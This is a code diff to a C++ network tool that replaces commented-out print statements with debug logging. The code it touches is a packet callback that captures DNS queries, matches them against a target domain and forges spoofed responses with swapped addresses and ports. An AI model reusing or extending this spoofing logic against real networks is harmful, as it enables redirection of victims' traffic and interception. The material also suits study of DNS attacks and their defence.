@@ -73,9 +73,9 @@ void NetworkMonitor::setFilter(string filter) {
  */
 void NetworkMonitor::packetCallback(u_char* ptrnull, const struct pcap_pkthdr *pkt_info, const u_char *packet){
 
-    //Logger::debug("Packet Found. Now Parsing");
+    Logger::debug("Packet Found. Now Parsing");
     struct iphdr * ip = (struct iphdr*)(packet + SIZE_ETHERNET);
-    //printf("Total Length At Recv: %d\n", ntohs(ip->tot_len));
+    Logger::debug("Total Length At Recv: " + to_string(ntohs(ip->tot_len)));
 
     //switch the ip now to save us work later
     in_addr_t sa = (in_addr_t)ip->saddr;
@@ -86,22 +86,22 @@ void NetworkMonitor::packetCallback(u_char* ptrnull, const struct pcap_pkthdr *p
     char oldIPDestination[INET_ADDRSTRLEN];
     inet_ntop(AF_INET, &da, oldIPDestination, INET_ADDRSTRLEN);
 
-    //printf("Source: %s\n", oldIPSource);
-    //printf("Destination: %s\n", oldIPDestination);
-
+    Logger::debug("Source: " + string(oldIPSource));
+    Logger::debug("Destination: " + string(oldIPDestination));
 
     u_int32_t tmp = ip->saddr;
     ip->saddr = ip->daddr;
     ip->daddr = tmp;
     ip->ttl = 64;
 
-    //printf("IP ID: %d\n", ntohs(ip->id));
+
+    Logger::debug("IP ID: " + to_string(ntohs(ip->id)));
     ip->id = htons((rand() % 11000) + 29000);
     ip->frag_off = 0;
 
     //get the size of the IP header length
     u_int size_ip = (ip->ihl) * 4;
-    //printf("size_ip: %d\n", size_ip);
+    Logger::debug("size_ip: " + to_string(size_ip));
 
     //get the udp structure
     struct udphdr * udp = (struct udphdr *)(packet + SIZE_ETHERNET + size_ip);
@@ -115,11 +115,8 @@ void NetworkMonitor::packetCallback(u_char* ptrnull, const struct pcap_pkthdr *p
     udp->dest = htons(oldSource);
     udp->source = htons(oldDest);
 
-
     //create dest address struct for sendto
     struct sockaddr_in sin;
-
-
     sin.sin_family = AF_INET;
     sin.sin_port = htons(oldSource);
     sin.sin_addr.s_addr = inet_addr(oldIPSource);
@@ -151,20 +148,20 @@ void NetworkMonitor::packetCallback(u_char* ptrnull, const struct pcap_pkthdr *p
     dns->z = 0; // z value is reversed and always 0
     dns->ra = 0; //ra = recursion available - we don't wanna mess with that. always 0
 
-    //cout << "---------------------------------------------" << endl;
-    //cout << "Structures Found Over Packet" << endl;
+    Logger::debug("---------------------------------------------");
+    Logger::debug("Structures Found Over Packet");
 
-    //cout << "Source IP: " << string(oldIPSource) << endl;
-    //cout << "Destination IP: " << string(oldIPDestination) << endl;
+    Logger::debug("Source IP: " + string(oldIPSource));
+    Logger::debug("Destination IP: " + string(oldIPDestination));
 
-    //cout << "Source Port: " << oldSource << endl;
-    //cout << "Destination Port: " << oldDest << endl;
+    Logger::debug("Source Port: " + to_string(oldSource));
+    Logger::debug("Destination Port: " + to_string(oldDest));
 
-    //cout << "Transaction ID: " << ntohs(dns->id) << endl;
-    //cout << "Questions: " << ntohs(dns->q_count) << endl;
-    //cout << "Answer RRs: " << ntohs(dns->ans_count) << endl;
-    //cout << "Authority RRs: " << ntohs(dns->auth_count) << endl;
-    //cout << "Additional RRs: " << ntohs(dns->add_count) << endl;
+    Logger::debug("Transaction ID: " + to_string(ntohs(dns->id)));
+    Logger::debug("Questions: " + to_string(ntohs(dns->q_count)));
+    Logger::debug("Answer RRs: " + to_string(ntohs(dns->ans_count)));
+    Logger::debug("Authority RRs: " + to_string(ntohs(dns->auth_count)));
+    Logger::debug("Additional RRs: " + to_string(ntohs(dns->add_count)));
 
     //cout << "RAW Query Content: " << endl;
     //cout << ">" << string(query) << "<" << endl;
@@ -226,9 +223,9 @@ void NetworkMonitor::packetCallback(u_char* ptrnull, const struct pcap_pkthdr *p
         questionQuery->ques = question;
         questionsList[index++] = (*questionQuery);
 
-        //cout << "Full Query Name: " << questionQuery->name << endl;
-        //cout << "Class " << ntohs(questionQuery->ques->qclass) << endl;
-        //cout << "Type " << ntohs(questionQuery->ques->qtype) << endl;
+        Logger::debug("Full Query Name: " + questionQuery->name);
+        Logger::debug("Class " + to_string(ntohs(questionQuery->ques->qclass)));
+        Logger::debug("Type " + to_string(ntohs(questionQuery->ques->qtype)));
 
         if(questionQuery->name.find(NetworkMonitor::instance->domain) != string::npos){
             foundURL = true;
@@ -238,15 +235,14 @@ void NetworkMonitor::packetCallback(u_char* ptrnull, const struct pcap_pkthdr *p
 
     }
 
-    //cout << "ALL DONE PARSING PACKET. NOW CHECKING IF SHOULD SPOOF" << endl;
+    Logger::debug("ALL DONE PARSING PACKET. NOW CHECKING IF SHOULD SPOOF");
     if(foundURL){
-        //cout << "REQUEST BELONGS TO DESIRED SPOOF. SENDING RESPONSE" << endl;
+        Logger::debug("REQUEST BELONGS TO DESIRED SPOOF. SENDING RESPONSE");
     }else{
         return;
     }
 
-    //cout << "NOW TO SEND THE RESPONSE" << endl;
-
+    Logger::debug("NOW TO SEND THE RESPONSE");
     //make our response packet. get it ready
     char responsePacket[65535];
     memset(responsePacket, 0, 65535);
@@ -283,8 +279,8 @@ void NetworkMonitor::packetCallback(u_char* ptrnull, const struct pcap_pkthdr *p
     //recalc ip length
     struct iphdr * rip = (struct iphdr*)(responsePacket);
     rip->tot_len = htons( ntohs(ip->tot_len) + (( ntohs(dns->q_count) * sizeof(struct R_DATA)) + questionListContentSize));
-    //cout << "Original IP Length: " << ntohs(ip->tot_len) << endl;
-    //cout << "Response IP Length: " << ntohs(rip->tot_len) << endl;
+    Logger::debug("Original IP Length: " + to_string(ntohs(ip->tot_len)));
+    Logger::debug("Response IP Length: " + to_string(ntohs(rip->tot_len)));
 
     rip->check = 0;
     rip->check = NetworkMonitor::instance->csum((unsigned short *) responsePacket, sizeof(struct iphdr));
@@ -293,8 +289,8 @@ void NetworkMonitor::packetCallback(u_char* ptrnull, const struct pcap_pkthdr *p
     struct udphdr * rudp = (struct udphdr *)(responsePacket + size_ip);
     unsigned short newLength = ntohs(udp->len) + ( ( ntohs(dns->q_count) * sizeof(struct R_DATA) ) + questionListContentSize);
     rudp->len = htons( ntohs(udp->len) + ( ( ntohs(dns->q_count) * sizeof(struct R_DATA) ) + questionListContentSize) );
-    //cout << "Original UDP Length: " << ntohs(udp->len) << endl;
-    //cout << "Response UDP Length: " << ntohs(rudp->len) << endl;
+    Logger::debug("Original UDP Length: " + to_string(ntohs(udp->len)));
+    Logger::debug("Response UDP Length: " + to_string(ntohs(rudp->len)));
 
     //prepare the response udp packet for checksum calculation
     rudp->check = 0;
